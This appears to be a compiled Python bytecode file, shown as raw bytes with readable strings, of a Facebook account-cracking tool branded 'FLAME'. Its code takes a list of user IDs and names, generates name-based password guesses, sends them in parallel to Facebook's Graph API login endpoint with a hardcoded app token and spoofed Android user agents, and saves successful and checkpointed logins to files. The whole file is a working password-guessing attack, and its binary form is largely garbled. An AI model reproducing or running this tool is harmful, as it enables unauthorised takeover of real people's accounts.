�
    ��d�  �                   �z  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlmZ d dlmZ dZdZdZdZdZg Z ed	�  �        D ]�Z ej        g d
��  �        Z ej        g d��  �        Z ej        dd�  �        Z ej        dd�  �        Z ej        dd�  �        Z ej        dd�  �        Z ej        g d��  �        Zde� de� de� de� de� de� de� d�Z de� de� de� de� de� de� de� d�Z! ej        e e!g�  �        Z"e�#                    e"�  �         �� G d� d�  �        Z$ e$�   �          dS ) �    N)�ThreadPoolExecutor)�ConnectionErrorz[1;97mz[1;91mz[1;92mz[1;93mz[0mi'  )�3�4�5�6�7�8�9�10�11�12�13)�OPM1�TP1A�RP1A�PPR1�PKQ1�QP1A�SP1A�RKQ1i� iP4 �I   �d   ih  i$  �(   �   )zSM-J730Fz	SM-A405FNz	SM-J610FNzSM-X11OzSM-Q130AzMozilla/5.0 (Linux; Android z; z Build/�.zD.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/z.0.z Mobile Safari/537.36zD.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/z) Mobile Safari/537.36 OPR/60.0.2254.59405c                   �2   � e Zd Zd� Zd� Zd� Zd� Zd� Zd� ZdS )�	crackfilec                 �   � dg g g g g f\  | _         | _        | _        | _        | _        | _        t          j        �   �         | _        | �	                    �   �          d S )Nr   )
�loop�ugen�ok�cp�id1�id2�requests�Session�ses�file��selfs    �pre.py�__init__zcrackfile.__init__   sO   � �DE�b��B�r�RT�DT�A�D�I�d�i����������'�)�)�D�H��I�I�K�K�K�K�K�    c                 �   � dt           j        �                    �   �         v rt          j        d�  �         d S #  Y d S xY wd S )N�linux�clear)�sys�platform�lower�os�systemr*   s    r,   �ClearCoyzcrackfile.ClearCoy!   sF   � ��#�,�,�,�.�.�.�.��i��(�(�(�(�(��������� /�.s   �7 �<c                 �  � t          t          j        t          t          t
          g�  �        �  �        }t          j        �                    d|� dt          � | j
        � dt          | j        �  �        � dt
          � t          | j        �  �        � dt          � dt          � t          | j        �  �        � t          � ��  �         t          j        �                    �   �          |D �]}	 t          j        t"          �  �        }d}d|d�}d	||d
d�}| j        �                    d||d��  �        �                    �   �         }	d|	v rct+          dt
          � d|� d|� ��  �         t-          dd�  �        �                    |� d|� d��  �         | j        �                    |�  �          �nMd|	d         d         v rbt+          dt          � d|� d|� ��  �         t-          dd�  �        �                    |� d|� d��  �         | j        �                    |�  �          n�d|	v r�t          j        �                    dt          � dt          � | j
        � dt          | j        �  �        � dt
          � dt          | j        �  �        � dt          � dt          | j        �  �        � ��  �         t          j        �                    �   �          n��ސ��# t0          j        j        $ r t7          j        d�  �         Y ��w xY w| xj
        dz  c_
        d S ) N�z
[ FLAME ] �|� z| z�[FBAN/FB4A;FBAV/307.0.0.53.7;FBBV/354336875;FBDM/{density=2.0,width=720,height=1384};FBLC/en_GB;FBRV/0;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G930F;FBSV/6.0;FBOP/12;FBCA/armeabi-v7a:armeabi;]z6OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16)�Authorizationz
user-agent�json�password)�data�emailr>   �credentials_typez%https://graph.facebook.com/auth/loginF)�params�headers�allow_redirects�session_keyz[OK] z | z/sdcard/ok.txt�a�
zwww.facebook.com�error�messagez[CP] z/sdcard/cp.txtz5Calls to this api have exceeded the rate limit. (613)z[SPAM] zOK : zCP : �#   �   )�str�random�choice�M�K�Hr2   �stdout�write�Pr    �lenr%   r"   r#   �N�flushr!   r(   �postr=   �print�open�appendr&   �
exceptionsr   �time�sleep)
r+   �username�passz�xxxr>   �ua�flame�head�date�xnxxs
             r,   �apizcrackfile.api&   s  � ��f�m�Q��1�I�.�.�/�/�C��J���{�#�{�{��{�D�I�{�{��D�H���{�{�PQ�{�SV�W[�W^�S_�S_�{�{�bc�{�{�gh�{�jm�nr�nu�jv�jv�{�xy�{�{�|�|�|�  ~A�  ~H�  ~N�  ~N�  ~P�  ~P�  ~P�!� M� M��M�!�=��.�.�� !@��L�� �  ��
 ���!�	 �  ��  $�x�}�}�-T�]a�ko�  BG�}�   H�   H�   M�   M�   O�   O��(�D�0�0�#�$H��$H�$H��$H�$H�h�$H�$H�I�I�I�"�#3�C�8�8�>�>�(�?Y�?Y�X�?Y�?Y�?Y�Z�Z�Z�"�g�n�n�X�6�6�6�#�e�/�4��=��3K�K�K�#�$H��$H�$H��$H�$H�h�$H�$H�I�I�I�"�#3�C�8�8�>�>�(�?Y�?Y�X�?Y�?Y�?Y�Z�Z�Z�"�g�n�n�X�6�6�6�#�e�T�X\�\�\�]`�]g�]m�]m�  oJ�st�  oJ�  oJ�}~�  oJ�  AE�  AJ�  oJ�  oJ�  MP�  QU�  QY�  MZ�  MZ�  oJ�  oJ�  ]^�  oJ�  oJ�  eh�  im�  ip�  eq�  eq�  oJ�  oJ�  tu�  oJ�  oJ�  |�  @D�  @G�  |H�  |H�  oJ�  oJ�  ^K�  ^K�  ^K�  LO�  LV�  L\�  L\�  L^�  L^�  L^�  L^�%� L^��!�,�<�L�L�L�d�j��n�n�n�n�n�L�����I�I�q�L�I�I�I�Is!   �%B;K�#A0K�B(K�(K-�,K-c                 �$  � | �                     �   �          t          d��  �        5 }| j        D �]:}|�                    d�  �        d         |�                    d�  �        d         �                    �   �         }}|�                    d�  �        d         }t          |�  �        dk    rft          |�  �        dk    st          |�  �        dk    rn~|d	z   |d
z   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   g}n?||d	z   |d
z   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   |dz   g}|�                    | j        ||�  �         ��<	 d d d �  �         n# 1 swxY w Y   t          d�  �         d S )N�   )�max_workersr:   r   rK   r;   �   �   �321�123�1234�12345�123456�01�02�03�04�05�06�07�08�09r   z

Crack Success  )	�intelr   r%   �splitr4   rU   �submitrg   �exit)r+   rc   �idf�uid�userra   �pwds          r,   �listpwzcrackfile.listpwG   s  � ��J�J�L�L�L�#��3�3�3� !7�u�!�X�  7�  7�c�#&�9�9�S�>�>�!�#4�c�i�i��n�n�Q�6G�6M�6M�6O�6O�D��"�j�j��o�o�a�0���t�9�9�q�=�=�"%�c�(�(�Q�,�,�#�c�(�(�Q�,�,�t� *-�U��),�U��),�V��),�W��),�X��),�T��#�d�(�),�T��#�d�(�),�T��#�d�(�),�T��#�d�(�),�T��#�d�(�*&�S�S� #'�"%�e�)�"%�e�)�"%�f�*�"%�g�+�"%�h�,�"%�d�(�3�t�8�"%�d�(�3�t�8�"%�d�(�3�t�8�"%�d�(�3�t�8�"%�d�(�3�t�8�#�c� ���T�X�c�#�6�6�6�6�A 7�!7� !7� !7� !7� !7� !7� !7� !7� !7� !7� !7���� !7� !7� !7� !7�D �&�'�'�'�'�'s   �EE6�6E:�=E:c           	      �  � | �                     �   �          t          t          � d��  �         t          dt          � dt          � d��  �         t          t          � d��  �         t          t          � dt          � dt          � dt          � ��  �        }	 t          |d�  �        �                    �   �         D ].}| j        �	                    |�
                    �   �         �  �         �/n7# t          $ r* t          t          � dt          � d	t          � d
��  �         Y nw xY w| j        D ]}| j        �                    d|�  �         �| �                    �   �          d S )N�,--------------------------------------------z�    ________    ___    __  _________
   / ____/ /   /   |  /  |/  / ____/
  / /_  / /   / /| | / /|_/ / __/   
 / __/ / /___/ ___ |/ /  / / /___   
/_/   /_____/_/  |_/_/  /_/_____/   z XD z%
                                    �[�?z] YOUR FILE : �r�   ×z] ERROR!r   )r7   rY   rV   rQ   rT   �inputrZ   �	readlinesr$   r[   �strip�IOErrorr~   rO   r%   �insertr�   )r+   r)   �line�ihs       r,   r)   zcrackfile.filem   ss  � ��M�M�O�O�O��Q�D�D�D�E�E�E�� (� &'�	(� (� -.�	(� (� (� )� )� )� �Q�D�D�D�E�E�E��A�8�8��8�8�A�8�8�Q�8�8�9�9�D�0�!�$��_�_�6�6�8�8� 5� 5�T��x���t�z�z�|�|�4�4�4�4�5��� 0� 0� 0��!�.�.�a�.�.�1�.�.�.�/�/�/�/�/�0�����h� )� )���(�/�/�!�R�(�(�(�(��K�K�M�M�M�M�Ms   �AC$ �$1D�Dc                 �b   � t          t          � d��  �         t          t          � d��  �         d S )NzV--------------------------------------------
CLONE STARTED AROPLAIN MODE EVERY MINUTESr�   )rY   rV   r*   s    r,   r{   zcrackfile.intel�   s6   � ��Q�o�o�o�p�p�p��Q�D�D�D�E�E�E�E�Er.   N)	�__name__�
__module__�__qualname__r-   r7   rg   r�   r)   r{   � r.   r,   r   r      su   � � � � � �� � �
� � �
� � �B$(� $(� $(�L� � �(F� F� F� F� Fr.   r   )%r5   r2   �rer]   r&   �calendarrM   �bs4�uuidr=   �
subprocess�concurrent.futuresr   �requests.exceptionsr   rT   rO   rQ   rP   rV   r!   �range�trN   rF   �b�	randrange�c�d�e�f�random1�flame1�flame2�uaku2r[   r   r�   r.   r,   �<module>r�      s�  �� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� Q� 1� 1� 1� 1� 1� 1� /� /� /� /� /� /�����������	��	��u��� � �A��6�=�B�B�B�C�C���6�=�J�J�J�K�K���6��F�6�"�"���6��B�s�����6��D������6��B�s����	���P�P�P�	Q�	Q�� 	j�q�  	j�  	j�G�  	j�  	j�A�  	j�  	j��  	j�  	j�  HI�  	j�  	j�  NO�  	j�  	j�  RS�  	j�  	j�  	j�� 	~�q�  	~�  	~�G�  	~�  	~�A�  	~�  	~��  	~�  	~�  HI�  	~�  	~�  NO�  	~�  	~�  RS�  	~�  	~�  	~��	����v��	'�	'�����U�����iF� iF� iF� iF� iF� iF� iF� iF�V 
�	�����r.   